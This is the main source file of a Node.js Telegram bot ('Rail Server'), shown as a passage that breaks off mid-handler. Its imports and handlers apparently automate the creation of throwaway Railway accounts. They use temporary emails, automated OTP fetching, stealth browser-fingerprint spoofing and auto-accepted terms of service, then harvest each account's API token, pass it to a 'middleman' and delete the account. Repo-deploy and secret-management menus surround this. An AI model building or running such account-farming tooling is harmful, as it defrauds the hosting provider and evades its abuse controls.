require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const { firefox } = require('playwright');
const path = require('path');
const fs = require('fs');
const spoofConfig = require('./spoof_config');
const { generateStealthScript } = require('./stealth_injections');
const { harvestRailwayApiToken, dispatchTokenToMiddleman, handleRailwayTermsOfService, deleteCurrentRailwayAccount } = require('./token_harvester');
const { generateTempEmail, fetchRawOtp } = require('./tempmail_client');
const {
    saveD1RepoEnvs,
    saveD1RepoDeployment,
    parseEnvContent,
    extractAndPurgeRepoZip,
    pushFilesToGitHub,
    downloadGitHubRepoZip,
    downloadTelegramFileBuffer,
    getUserRepos,
    getRepoDetails,
    toggleRepoVisibility,
    deleteRepoFromGitHubAndD1,
    clearRepoEnvs
} = require('./deploy_pipeline');

const token = process.env.TELEGRAM_BOT_TOKEN;
const ownerIdsStr = process.env.TELEGRAM_OWNER_IDS || '';

if (!token || token.includes('your_bot_token_here')) {
    console.error('❌ TELEGRAM_BOT_TOKEN is missing or not configured in .env');
    process.exit(1);
}

const bot = new TelegramBot(token, { polling: true });
const userSessions = new Map();

// ----------------------------------------------------
// Persistent Configuration Management (Domains & Users)
// ----------------------------------------------------
const DOMAIN_CONFIG_FILE = path.resolve(__dirname, 'domain_config.json');

function loadDomainConfig() {
    try {
        if (fs.existsSync(DOMAIN_CONFIG_FILE)) {
            const data = JSON.parse(fs.readFileSync(DOMAIN_CONFIG_FILE, 'utf-8'));
            const domains = Array.isArray(data.domains) && data.domains.length > 0
                ? data.domains
                : ['mailu.site'];
            const authorizedUsers = Array.isArray(data.authorizedUsers)
                ? data.authorizedUsers
                : [];
            return {
                domains: domains,
                defaultDomain: data.defaultDomain || 'mailu.site',
                authorizedUsers: authorizedUsers
            };
        }
    } catch (e) {
        console.error('Error reading domain_config.json:', e.message);
    }
    return {
        domains: ['mailu.site'],
        defaultDomain: 'mailu.site',
        authorizedUsers: []
    };
}

function saveDomainConfig(config) {
    try {
        fs.writeFileSync(DOMAIN_CONFIG_FILE, JSON.stringify(config, null, 2), 'utf-8');
    } catch (e) {
        console.error('Error saving domain_config.json:', e.message);
    }
}

function addDomainToConfig(rawDomain) {
    if (!rawDomain) return false;
    let clean = rawDomain.trim().toLowerCase();
    clean = clean.replace(/^@+/, '');
    clean = clean.replace(/^https?:\/\//, '');
    clean = clean.replace(/\/.*$/, '');
    clean = clean.trim();

    if (!clean || !clean.includes('.') || clean.length < 4) {
        return false;
    }

    const config = loadDomainConfig();
    if (!config.domains.includes(clean)) {
        config.domains.push(clean);
        saveDomainConfig(config);
    }
    return clean;
}

function removeDomainFromConfig(domain) {
    const config = loadDomainConfig();
    config.domains = config.domains.filter(d => d !== domain);
    if (config.defaultDomain === domain) {
        config.defaultDomain = null;
    }
    if (config.domains.length === 0) {
        config.domains = ['mailu.site'];
    }
    saveDomainConfig(config);
}

function setDefaultDomainInConfig(domain) {
    const config = loadDomainConfig();
    if (config.domains.includes(domain)) {
        config.defaultDomain = domain;
        saveDomainConfig(config);
        return true;
    }
    return false;
}

function resetDefaultDomainInConfig() {
    const config = loadDomainConfig();
    config.defaultDomain = null;
    saveDomainConfig(config);
}

function addAuthorizedUser(userInput) {
    if (!userInput) return false;
    let clean = userInput.trim();
    if (!clean) return false;

    let formatted = clean;
    if (!/^\d+$/.test(clean)) {
        formatted = clean.startsWith('@') ? clean.toLowerCase() : `@${clean.toLowerCase()}`;
    }

    const config = loadDomainConfig();
    if (!config.authorizedUsers.includes(formatted)) {
        config.authorizedUsers.push(formatted);
        saveDomainConfig(config);
    }
    return formatted;
}

function removeAuthorizedUser(user) {
    const config = loadDomainConfig();
    config.authorizedUsers = config.authorizedUsers.filter(u => u !== user);
    saveDomainConfig(config);
}

// ----------------------------------------------------
// Authorization Helpers
// ----------------------------------------------------
function isOwner(userId) {
    if (!userId) return false;
    const ownerStr = String(process.env.TELEGRAM_OWNER_IDS || '').trim();
    if (!ownerStr) return false;
    const ownerIds = ownerStr.split(',').map(s => s.trim()).filter(Boolean);
    return ownerIds.includes(String(userId).trim());
}

function isAuthorized(userId, username) {
    if (isOwner(userId)) return true;
    const config = loadDomainConfig();
    const uidStr = String(userId || '').trim();
    const uName = username ? username.replace(/^@+/, '').trim().toLowerCase() : '';

    return config.authorizedUsers.some(u => {
        const cleanU = String(u).trim().replace(/^@+/, '').toLowerCase();
        return cleanU === uidStr || (uName && cleanU === uName);
    });
}

// ----------------------------------------------------
// Random Email Generator
// ----------------------------------------------------
async function generateRandomEmail(domain) {
    if (!domain || domain === 'mailu.site') {
        return await generateTempEmail();
    }
    const cleanDomain = domain.replace(/^@+/, '').replace(/^https?:\/\//, '').trim().toLowerCase();
    const prefixes = [
        'jack', 'alex', 'sam', 'david', 'ryan', 'leo', 'kevin', 'lucas', 'noah',
        'felix', 'max', 'eric', 'ethan', 'oliver', 'liam', 'mason', 'james',
        'logan', 'henry', 'daniel', 'michael', 'matthew', 'jackson', 'sebastian'
    ];
    const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    const randomNum = Math.floor(100 + Math.random() * 9000);
    const username = `${randomPrefix}${randomNum}`;
    return `${username}@${cleanDomain}`;
}

// ----------------------------------------------------
// Session Management
// ----------------------------------------------------
function getSession(chatId) {
    if (!userSessions.has(chatId)) {
        userSessions.set(chatId, {
            browserContext: null,
            page: null,
            state: 'IDLE', // IDLE, WAITING_EMAIL, WAITING_OTP, WAITING_NEW_DOMAIN_AB, WAITING_NEW_DOMAIN_SETUP, WAITING_NEW_USER_SETUP
            email: null,
            timeoutTimer: null,
            statusMsgId: null
        });
    }
    return userSessions.get(chatId);
}

async function closeAndCleanSession(chatId, silent = false) {
    // Keep browser session alive for live debugging unless explicitly closed
    if (process.env.AUTO_CLOSE_SESSION === 'false' || process.env.HEADLESS === 'false') {
        console.log(`[Debug Mode] Preserving live browser session for chat: ${chatId}`);
        return;
    }

    const session = userSessions.get(chatId);
    if (!session) return;

    if (session.timeoutTimer) {
        clearTimeout(session.timeoutTimer);
        session.timeoutTimer = null;
    }

    if (session.browserContext) {
        await session.browserContext.close().catch(() => {});
    }

    try {
        const sessionDir = path.resolve(__dirname, 'sessions', `firefox_profile_${chatId}`);
        clearDirectorySafe(sessionDir);
    } catch (e) {}

    userSessions.delete(chatId);

    if (!silent && chatId) {
        await bot.sendMessage(chatId, '⚠️ Session closed due to inactivity.').catch(() => {});
    }
}

async function forceKillChatSession(chatId) {
    const session = userSessions.get(chatId);
    if (session) {
        if (session.timeoutTimer) {
            clearTimeout(session.timeoutTimer);
            session.timeoutTimer = null;
        }
        if (session.browserContext) {
            try {
                await Promise.race([
                    session.browserContext.close(),
                    new Promise(r => setTimeout(r, 3000))
                ]);
            } catch (e) {}
            session.browserContext = null;
            session.page = null;
        }
        session.state = 'IDLE';
    }
    userSessions.delete(chatId);
    try {
        const sessionDir = path.resolve(__dirname, 'sessions', `firefox_profile_${chatId}`);
        clearDirectorySafe(sessionDir);
    } catch (e) {}
}

function startInactivityTimer(chatId) {
    // Auto-close disabled for live debugging
    const session = getSession(chatId);
    if (session.timeoutTimer) {
        clearTimeout(session.timeoutTimer);
        session.timeoutTimer = null;
    }
    // No auto close timer scheduled - keep browser active and alive
}

function clearDirectorySafe(dirPath) {
    if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
        return;
    }
    try {
        fs.rmSync(dirPath, { recursive: true, force: true });
    } catch (e) {
        try {
            const entries = fs.readdirSync(dirPath);
            for (const entry of entries) {
                try { fs.rmSync(path.join(dirPath, entry), { recursive: true, force: true }); } catch (err) {}
            }
        } catch (err) {}
    }
    if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });
}

// ----------------------------------------------------
// UI Menus
// ----------------------------------------------------
function getWelcomeMenu(userId) {
    const buttons = [
        [
            { text: '🚀 Deploy App', callback_data: 'action_deploy_app' },
            { text: '📦 My Repos', callback_data: 'menu_my_repos' }
        ],
        [
            { text: '🛠 Custom Build', callback_data: 'menu_custom_build' }
        ]
    ];

    if (isOwner(userId)) {
        buttons.push([
            { text: '⚙️ Setup', callback_data: 'menu_setup' }
        ]);
    }

    return {
        reply_markup: {
            inline_keyboard: buttons
        }
    };
}

function getCustomBuildMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '🚀 Auto Build', callback_data: 'action_autobuild' },
                    { text: '🛠 Custom', callback_data: 'action_custom' }
                ],
                [
                    { text: '🔙 Back to Menu', callback_data: 'menu_main' }
                ]
            ]
        }
    };
}

function getDeployAppMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '📦 Merged (.env inside repo)', callback_data: 'deploy_env_merged' }
                ],
                [
                    { text: '📑 Separated (.env separate)', callback_data: 'deploy_env_separated' }
                ],
                [
                    { text: '🔙 Back to Menu', callback_data: 'menu_main' }
                ]
            ]
        }
    };
}

function getAutoBuildMenu(isOwnerUser = false) {
    const config = loadDomainConfig();
    const rows = [];

    // Domain selection buttons
    for (const d of config.domains) {
        rows.push([{ text: `🌐 ${d}`, callback_data: `ab_domain_${d}` }]);
    }

    // Action buttons
    if (isOwnerUser) {
        rows.push([
            { text: '➕ Add Domain', callback_data: 'action_add_domain_ab' },
            { text: '🔙 Back', callback_data: 'menu_custom_build' }
        ]);
    } else {
        rows.push([
            { text: '🔙 Back', callback_data: 'menu_custom_build' }
        ]);
    }

    return {
        reply_markup: {
            inline_keyboard: rows
        }
    };
}

function getSetupMenu() {
    const config = loadDomainConfig();
    const rows = [];

    // Domain default buttons
    for (const d of config.domains) {
        const isDef = config.defaultDomain === d;
        rows.push([{
            text: isDef ? `✅ ${d} (Default)` : `🌐 Set Default: ${d}`,
            callback_data: `setup_set_def_${d}`
        }]);
    }

    // Domain controls
    rows.push([
        { text: '🔄 Reset Default', callback_data: 'setup_reset_def' },
        { text: '➕ Add Domain', callback_data: 'action_add_domain_setup' }
    ]);

    rows.push([
        { text: '🗑️ Delete Domain', callback_data: 'setup_delete_menu' }
    ]);

    // User Management controls
    rows.push([
        { text: '👤 ➕ Add User', callback_data: 'setup_add_user' },
        { text: '👤 🗑️ Delete User', callback_data: 'setup_delete_user_menu' }
    ]);

    // Back to main
    rows.push([
        { text: '🔙 Back to Menu', callback_data: 'menu_main' }
    ]);

    const defText = config.defaultDomain ? `\`${config.defaultDomain}\`` : '_None (Domain list active)_';
    const usersListText = config.authorizedUsers && config.authorizedUsers.length > 0
        ? config.authorizedUsers.map(u => `• \`${u}\``).join('\n')
        : '_No authorized users added yet_';

    const text = `⚙️ *Auto Build Setup & Configuration*\n\n🎯 *Current Default Domain:* ${defText}\n\n👥 *Authorized Users:*\n${usersListText}\n\n👇 *Use the buttons below to manage domains, default auto-build, and authorized users:*`;

    return {
        text,
        opts: {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: rows
            }
        }
    };
}

function getDeleteDomainMenu() {
    const config = loadDomainConfig();
    const rows = [];

    for (const d of config.domains) {
        rows.push([{ text: `❌ Delete ${d}`, callback_data: `setup_del_confirm_${d}` }]);
    }

    rows.push([{ text: '🔙 Back to Setup', callback_data: 'menu_setup' }]);

    return {
        text: '🗑️ *Select a domain to remove:*',
        opts: {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: rows
            }
        }
    };
}

function getDeleteUserMenu() {
    const config = loadDomainConfig();
    const rows = [];

    for (const u of config.authorizedUsers) {
        rows.push([{ text: `❌ Remove ${u}`, callback_data: `setup_del_user_confirm_${u}` }]);
    }

    rows.push([{ text: '🔙 Back to Setup', callback_data: 'menu_setup' }]);

    return {
        text: '👤 🗑️ *Select a user to revoke Auto Build permission:*',
        opts: {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: rows
            }
        }
    };
}

// ----------------------------------------------------
// Progress bar helper
// ----------------------------------------------------
const updateProg = async (chat, msgId, pct) => {
    const total = 12;
    const filled = Math.max(0, Math.min(total, Math.round((pct / 100) * total)));
    const hasHead = filled > 0 && filled < total;
    const bar = '━'.repeat(Math.max(0, filled - (hasHead ? 1 : 0))) + 
                (hasHead ? '╸' : '') + 
                '─'.repeat(Math.max(0, total - filled));
    await bot.editMessageText(`⚡ *Server Creating...*\n\`${bar}\` *${pct}%*`, {
        chat_id: chat,
        message_id: msgId,
        parse_mode: 'Markdown'
    }).catch(() => {});
};

async function sendToTargets(message, opts) {
    if (ownerIdsStr) {
        const ids = ownerIdsStr.split(',').map(s => s.trim()).filter(Boolean);
        for (const id of ids) {
            const finalOpts = opts || { parse_mode: 'Markdown', ...getWelcomeMenu(id) };
            await bot.sendMessage(id, message, finalOpts).catch(() => {});
        }
    }
}

// Startup
sendToTargets('🚂 Welcome to Rail Server');
console.log('🤖 Telegram Bot is running. Waiting for commands...');

// ----------------------------------------------------
// Command Handlers
// ----------------------------------------------------
bot.onText(/(^\/start|^\/rail|^start$|^rail$|^\/ping$|^\/help$)/i, async (msg) => {
    const chat = msg.chat.id;
    const userId = msg.from.id;
    const session = getSession(chat);
    session.state = 'IDLE';

    const isOwnerUser = isOwner(userId);
    const welcomeText = `⚡ *Rail Server Bot Online & Ready!*\n\n` +
        `👤 *Operator:* \`${msg.from.first_name || 'User'}\` (\`${userId}\`)\n` +
        `🛡 *Role:* ${isOwnerUser ? '⭐️ *Authorized Owner*' : 'Regular Operator'}\n` +
        `🟢 *Status:* Autonomous daemon active 24/7\n\n` +
        `Select an action below to get started:`;

    await bot.sendMessage(chat, welcomeText, {
        parse_mode: 'Markdown',
        ...getWelcomeMenu(userId)
    }).catch(async (err) => {
        console.error('Failed to send markdown welcome message:', err.message);
        await bot.sendMessage(chat, '🚂 Rail Server Bot is Online! Choose an option:', getWelcomeMenu(userId)).catch(() => {});
    });
});

bot.onText(/\/setup/, async (msg) => {
    const chat = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId)) {
        await bot.sendMessage(chat, '⛔ *Access Denied!*\n\n💬 *Support :* @xxbga', { parse_mode: 'Markdown' }).catch(() => {});
        return;
    }

    const session = getSession(chat);
    session.state = 'IDLE';
    const menu = getSetupMenu();
    await bot.sendMessage(chat, menu.text, menu.opts);
});

bot.onText(/\/(deploy|deployapp)/i, async (msg) => {
    const chat = msg.chat.id;
    const session = getSession(chat);
    session.state = 'IDLE';
    session.deployStaging = null;
    await bot.sendMessage(
        chat,
        '🚀 *Deploy Application*\n\n' +
        'Choose how your environment configuration (`.env`) is provided:\n\n' +
        '• *📦 Merged:* Upload a single repository archive (`.zip`) containing code and `.env`. The system strictly purges `.env` from the codebase, stores secrets securely in Cloudflare D1, and pushes sanitized code to GitHub.\n\n' +
        '• *📑 Separated:* First upload your repository (`.zip` or GitHub link), then provide your `.env` configuration separately in Step 2.',
        {
            parse_mode: 'Markdown',
            ...getDeployAppMenu()
        }
    ).catch(() => {});
});

bot.onText(/\/(repos|myrepos)/i, async (msg) => {
    const chat = msg.chat.id;
    const userId = msg.from.id;
    const session = getSession(chat);
    session.state = 'IDLE';
    session.deployStaging = null;
    await showMyReposMenu(chat, null, userId);
});

async function triggerAutonomousDeletionForChat(chat, targetEmail, statusMsgId = null) {
    const session = getSession(chat);
    let msgId = statusMsgId;
    if (!msgId) {
        const delMsg = await bot.sendMessage(chat, `🗑️ *Starting Account Deletion for:* \`${targetEmail}\`\nLogging in with Mailu OTP & deleting account...`, { parse_mode: 'Markdown' });
        msgId = delMsg.message_id;
    }

    try {
        const { runAutonomousDeletion } = require('./delete_worker');
        const success = await runAutonomousDeletion(targetEmail, {
            onOtpPrompt: async (email) => {
                session.state = 'WAITING_DELETE_OTP';
                session.pendingDeleteResolve = null;
                await bot.editMessageText(
                    `📧 Email: \`${email}\`\n\n🔑 MailU auto-fetch expired. Railway login code sent to email!\n\nPlease send the 6-digit OTP code to continue deletion:`,
                    { chat_id: chat, message_id: msgId, parse_mode: 'Markdown' }
                ).catch(() => {});

                return new Promise((resolve) => {
                    session.pendingDeleteResolve = resolve;
                    setTimeout(() => {
                        if (session.pendingDeleteResolve === resolve) {
                            session.pendingDeleteResolve = null;
                            if (session.state === 'WAITING_DELETE_OTP') session.state = 'IDLE';
                            resolve(null);
                        }
                    }, 90000);
                });
            }
        });

        if (success) {
            await bot.editMessageText(`✅ *Railway Account Deleted Successfully!*\n\n📧 *Email:* \`${targetEmail}\``, {
                chat_id: chat,
                message_id: msgId,
                parse_mode: 'Markdown'
            });
        } else {
            await bot.editMessageText(`❌ Failed to delete account for \`${targetEmail}\`. Check terminal logs.`, {
                chat_id: chat,
                message_id: msgId,
                parse_mode: 'Markdown'
            });
        }
    } catch (e) {
        await bot.editMessageText(`❌ Error deleting account: ${e.message}`, {
            chat_id: chat,
            message_id: msgId
        });
    }
}

bot.onText(/\/delete_account(?:\s+(.+))?/, async (msg, match) => {
    const chat = msg.chat.id;
    const session = getSession(chat);
    const argEmail = match[1] ? match[1].trim() : null;
    const targetEmail = argEmail || session.email;

    if (!targetEmail || !targetEmail.includes('@')) {
        session.state = 'WAITING_DELETE_ACCOUNT_EMAIL';
        await bot.sendMessage(chat, '🗑️ *Delete Railway Account*\n\nPlease send the email address of the Railway account you want to delete (e.g. `user123@mailu.site`):', {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔙 Cancel', callback_data: 'menu_main' }]
                ]
            }
        });
        return;
    }

    // ONLY use live session if session.email STRICTLY matches targetEmail
    if (session.page && !session.page.isClosed() && session.email && session.email.toLowerCase() === targetEmail.toLowerCase()) {
        const delStatus = await bot.sendMessage(chat, `🗑️ *Deleting Railway Account for:* \`${targetEmail}\`\nNavigating to danger zone...`, { parse_mode: 'Markdown' });
        try {
            await deleteCurrentRailwayAccount(session.page, targetEmail);
            await bot.editMessageText(`✅ *Railway Account Deleted Successfully!*\n\n📧 *Email:* \`${targetEmail}\``, {
                chat_id: chat,
                message_id: delStatus.message_id,
                parse_mode: 'Markdown'
            });
            await forceKillChatSession(chat);
        } catch (delErr) {
            await bot.editMessageText(`❌ Failed to delete account: ${delErr.message}`, {
                chat_id: chat,
                message_id: delStatus.message_id
            });
        }
        return;
    }

    // Target email is different or session inactive: run autonomous deletion!
    await triggerAutonomousDeletionForChat(chat, targetEmail);
});

// ----------------------------------------------------
// Callback Query Handler
// ----------------------------------------------------
bot.on('callback_query', async (query) => {
    const chat = query.message.chat.id;
    const msgId = query.message.message_id;
    const userId = query.from.id;
    const username = query.from.username;
    const action = query.data;

    // Navigation: Main Menu
    if (action === 'menu_main') {
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const session = getSession(chat);
        session.state = 'IDLE';
        session.deployStaging = null;
        await bot.editMessageText('🚂 Welcome to Rail Server', {
            chat_id: chat,
            message_id: msgId,
            ...getWelcomeMenu(userId)
        }).catch(() => {});
        return;
    }

    // Navigation: Custom Build Submenu
    if (action === 'menu_custom_build') {
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const session = getSession(chat);
        session.state = 'IDLE';
        session.deployStaging = null;
        await bot.editMessageText('🛠 *Custom Build Suite*\n\nSelect an autonomous builder mode:', {
            chat_id: chat,
            message_id: msgId,
            parse_mode: 'Markdown',
            ...getCustomBuildMenu()
        }).catch(() => {});
        return;
    }

    // Navigation: Deploy App Choices
    if (action === 'action_deploy_app') {
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const session = getSession(chat);
        session.state = 'IDLE';
        session.deployStaging = null;
        await bot.editMessageText(
            '🚀 *Deploy Application Pipeline*\n\n' +
            'Choose how your environment configuration (`.env`) is provided:\n\n' +
            '• *📦 Merged:* Upload a single repository archive (`.zip`) containing code and `.env`. The system strictly purges `.env` from the codebase, stores secrets securely in Cloudflare D1, and pushes sanitized code to GitHub.\n\n' +
            '• *📑 Separated:* First upload your repository (`.zip` or GitHub link), then provide your `.env` configuration separately in Step 2.',
            {
                chat_id: chat,
                message_id: msgId,
                parse_mode: 'Markdown',
                ...getDeployAppMenu()
            }
        ).catch(() => {});
        return;
    }

    // Deploy App: Merged Flow
    if (action === 'deploy_env_merged') {
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const session = getSession(chat);
        session.state = 'WAITING_REPO_MERGED';
        session.deployStaging = null;
        await bot.editMessageText(
            '📦 *Merged Deployment Pipeline*\n\n' +
            'Please upload your repository as a `.zip` archive document.\n\n' +
            '🛡️ *Nuclear Security Shield:*\n' +
            'Any `.env` file (`.env`, `.env.local`, `.env.production`) will be automatically extracted, saved into *Cloudflare D1* (`repo_envs`), and *strictly purged* from the codebase before pushing to GitHub.',
            {
                chat_id: chat,
                message_id: msgId,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔙 Back', callback_data: 'action_deploy_app' }]
                    ]
                }
            }
        ).catch(() => {});
        return;
    }

    // Deploy App: Separated Flow (Step 1)
    if (action === 'deploy_env_separated') {
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const session = getSession(chat);
        session.state = 'WAITING_REPO_SEP';
        session.deployStaging = null;
        await bot.editMessageText(
            '📑 *Separated Deployment (Step 1 of 2)*\n\n' +
            'Please upload your repository as a `.zip` file document, or send a public GitHub repository link (e.g. `https://github.com/user/my-app`):\n\n' +
            'ℹ️ *Note:* Keep your `.env` separate. You will be prompted to provide it in Step 2.',
            {
                chat_id: chat,
                message_id: msgId,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔙 Back', callback_data: 'action_deploy_app' }]
                    ]
                }
            }
        ).catch(() => {});
        return;
    }

    // Deploy App: Skip Env in Separated Flow
    if (action === 'deploy_skip_env_sep') {
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const session = getSession(chat);
        if (session.state !== 'WAITING_ENV_SEP' || !session.deployStaging) {
            await bot.sendMessage(chat, '⚠️ No pending repository staging found. Please start over from Deploy App.', getWelcomeMenu(userId));
            return;
        }
        await executeDeployPush(chat, session, {}, session.targetUpdateRepo, userId);
        return;
    }

    // ----------------------------------------------------
    // My Repositories & Management Callbacks
    // ----------------------------------------------------
    if (action === 'menu_my_repos') {
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const session = getSession(chat);
        session.state = 'IDLE';
        session.deployStaging = null;
        session.targetUpdateRepo = null;
        await showMyReposMenu(chat, msgId, userId);
        return;
    }

    if (action.startsWith('repo_view_')) {
        const repoName = action.replace('repo_view_', '');
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const session = getSession(chat);
        session.state = 'IDLE';
        session.deployStaging = null;
        session.targetUpdateRepo = null;
        await showRepoDashboard(chat, msgId, repoName, userId);
        return;
    }

    if (action.startsWith('repo_vis_')) {
        const repoName = action.replace('repo_vis_', '');
        await bot.answerCallbackQuery(query.id, { text: '🔄 Updating visibility...' }).catch(() => {});
        try {
            const res = await toggleRepoVisibility(repoName);
            await bot.answerCallbackQuery(query.id, {
                text: res.isPrivate ? '🔒 Repository is now PRIVATE' : '🌐 Repository is now PUBLIC',
                show_alert: true
            }).catch(() => {});
            await showRepoDashboard(chat, msgId, repoName, userId);
        } catch (err) {
            await bot.answerCallbackQuery(query.id, { text: `❌ Error: ${err.message}`, show_alert: true }).catch(() => {});
        }
        return;
    }

    if (action.startsWith('repo_deploy_')) {
        const repoName = action.replace('repo_deploy_', '');
        await bot.answerCallbackQuery(query.id, {
            text: `🚂 Railway Auto-Deployment for "${repoName}" is scheduled for Phase 2.\nRepository codebase & D1 secrets are fully synced and ready!`,
            show_alert: true
        }).catch(() => {});
        return;
    }

    if (action.startsWith('repo_del_ask_')) {
        const repoName = action.replace('repo_del_ask_', '');
        await bot.answerCallbackQuery(query.id).catch(() => {});
        await bot.editMessageText(
            `⚠️ *Are you sure you want to permanently delete repository:* \`${repoName}\`?\n\n` +
            `• The repository will be deleted from GitHub.\n` +
            `• All environment secrets in Cloudflare D1 will be purged.\n` +
            `• Deployment status will be erased.\n\n` +
            `*This action cannot be undone!*`,
            {
                chat_id: chat,
                message_id: msgId,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🗑️ Yes, Delete Permanently', callback_data: `repo_del_yes_${repoName}` }],
                        [{ text: '❌ Cancel (Keep Repo)', callback_data: `repo_view_${repoName}` }]
                    ]
                }
            }
        ).catch(() => {});
        return;
    }

    if (action.startsWith('repo_del_yes_')) {
        const repoName = action.replace('repo_del_yes_', '');
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const delWait = await bot.sendMessage(chat, `⏳ *Deleting repository \`${repoName}\` from GitHub & Cloudflare D1...*`, { parse_mode: 'Markdown' });
        try {
            const res = await deleteRepoFromGitHubAndD1(repoName);
            await bot.editMessageText(`✅ Repository \`${repoName}\` has been permanently deleted from GitHub and Cloudflare D1.`, {
                chat_id: chat,
                message_id: delWait.message_id,
                parse_mode: 'Markdown'
            }).catch(() => {});
            await showMyReposMenu(chat, null, userId);
        } catch (err) {
            await bot.editMessageText(`❌ Failed to delete repository: ${err.message}`, {
                chat_id: chat,
                message_id: delWait.message_id
            }).catch(() => {});
        }
        return;
    }

    if (action.startsWith('repo_env_add_')) {
        const repoName = action.replace('repo_env_add_', '');
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const session = getSession(chat);
        session.state = 'WAITING_ENV_UPDATE';
        session.targetRepo = repoName;
        await bot.editMessageText(
            `🔐 *Update Environment Variables for \`${repoName}\`*\n\n` +
            `Please send your environment variables:\n` +
            `• Direct text message with \`KEY=VALUE\` lines, OR\n` +
            `• Upload a \`.env\` file document.\n\n` +
            `Variables will be safely encrypted & stored in Cloudflare D1.`,
            {
                chat_id: chat,
                message_id: msgId,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔙 Cancel', callback_data: `repo_env_${repoName}` }]
                    ]
                }
            }
        ).catch(() => {});
        return;
    }

    if (action.startsWith('repo_env_clear_ask_')) {
        const repoName = action.replace('repo_env_clear_ask_', '');
        await bot.answerCallbackQuery(query.id).catch(() => {});
        await bot.editMessageText(
            `⚠️ *Are you sure you want to clear all environment secrets for \`${repoName}\` from Cloudflare D1?*`,
            {
                chat_id: chat,
                message_id: msgId,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🗑️ Yes, Clear All Secrets', callback_data: `repo_env_clear_yes_${repoName}` }],
                        [{ text: '❌ Cancel', callback_data: `repo_env_${repoName}` }]
                    ]
                }
            }
        ).catch(() => {});
        return;
    }

    if (action.startsWith('repo_env_clear_yes_')) {
        const repoName = action.replace('repo_env_clear_yes_', '');
        await bot.answerCallbackQuery(query.id).catch(() => {});
        await clearRepoEnvs(repoName);
        await bot.sendMessage(chat, `✅ Cleared all environment secrets for \`${repoName}\` from Cloudflare D1.`);
        await showRepoEnvMenu(chat, null, repoName);
        return;
    }

    if (action.startsWith('repo_env_')) {
        const repoName = action.replace('repo_env_', '');
        await bot.answerCallbackQuery(query.id).catch(() => {});
        await showRepoEnvMenu(chat, msgId, repoName);
        return;
    }

    if (action.startsWith('repo_edit_')) {
        const repoName = action.replace('repo_edit_', '');
        await bot.answerCallbackQuery(query.id).catch(() => {});
        await bot.editMessageText(
            `✏️ *Update Codebase: \`${repoName}\`*\n\n` +
            `Choose how your updated repository files and environment configuration are provided:\n\n` +
            `• *📦 Merged Update:* Upload new \`.zip\` archive containing updated code and \`.env\`.\n` +
            `• *📑 Separated Update:* First upload new \`.zip\` archive (or GitHub link), then provide \`.env\` separately in Step 2.`,
            {
                chat_id: chat,
                message_id: msgId,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '📦 Merged Update (.env inside repo)', callback_data: `repo_up_merged_${repoName}` }],
                        [{ text: '📑 Separated Update (.env separate)', callback_data: `repo_up_sep_${repoName}` }],
                        [{ text: '🔙 Back to Repo Dashboard', callback_data: `repo_view_${repoName}` }]
                    ]
                }
            }
        ).catch(() => {});
        return;
    }

    if (action.startsWith('repo_up_merged_')) {
        const repoName = action.replace('repo_up_merged_', '');
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const session = getSession(chat);
        session.state = 'WAITING_REPO_UPDATE_MERGED';
        session.targetUpdateRepo = repoName;
        session.deployStaging = null;
        await bot.editMessageText(
            `📦 *Merged Codebase Update for \`${repoName}\`*\n\n` +
            `Please upload your updated repository as a \`.zip\` archive document.\n\n` +
            `🛡️ *Nuclear Security Shield:*\n` +
            `Any \`.env\` files will be extracted, stored in Cloudflare D1, and purged before updating GitHub!`,
            {
                chat_id: chat,
                message_id: msgId,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔙 Cancel', callback_data: `repo_edit_${repoName}` }]
                    ]
                }
            }
        ).catch(() => {});
        return;
    }

    if (action.startsWith('repo_up_sep_')) {
        const repoName = action.replace('repo_up_sep_', '');
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const session = getSession(chat);
        session.state = 'WAITING_REPO_UPDATE_SEP';
        session.targetUpdateRepo = repoName;
        session.deployStaging = null;
        await bot.editMessageText(
            `📑 *Separated Codebase Update for \`${repoName}\` (Step 1 of 2)*\n\n` +
            `Please upload your updated repository as a \`.zip\` archive document, or send a public GitHub repository link:\n\n` +
            `ℹ️ Keep your \`.env\` separate — you will be prompted for it in Step 2.`,
            {
                chat_id: chat,
                message_id: msgId,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔙 Cancel', callback_data: `repo_edit_${repoName}` }]
                    ]
                }
            }
        ).catch(() => {});
        return;
    }

    // Navigation: Setup Menu (Owner Only)
    if (action === 'menu_setup') {
        if (!isOwner(userId)) {
            await bot.answerCallbackQuery(query.id, {
                text: '⛔ Access Denied!\n\n💬 Support : @xxbga',
                show_alert: true
            }).catch(() => {});
